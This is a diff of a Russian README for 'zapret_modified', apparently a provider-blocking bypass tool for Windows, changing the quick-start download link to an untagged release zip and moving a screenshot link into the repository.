@@ -8,7 +8,7 @@
 
 ## Быстрый старт
 
-Скачать архив: https://github.com/korsa351/zapret_modified/archive/refs/heads/main.zip
+Скачать архив: https://github.com/korsa351/zapret_modified/releases/download/untagged-f151d3beafb48903e22e/zapret_modified-main.zip
 
 ### exe
 1. Запустить файл /zapret-winws/preset_russia.cmd
@@ -20,6 +20,6 @@
 #### Проверка работы службы
 1. Windows+r → services.msc \ Поиск → Службы
 2. Ищем службу и убеждаемся в ее наличии и работе. Проверяем поля состояние и тип запуска.
-![](https://i.yapx.cc/YDcqR.png)
+![](https://github.com/korsa351/zapret_modified/blob/main/example.png)
 
 #### **Не гарантируется 100% работа, все зависит от настроек сети и оборудования конкретного провайдера.**
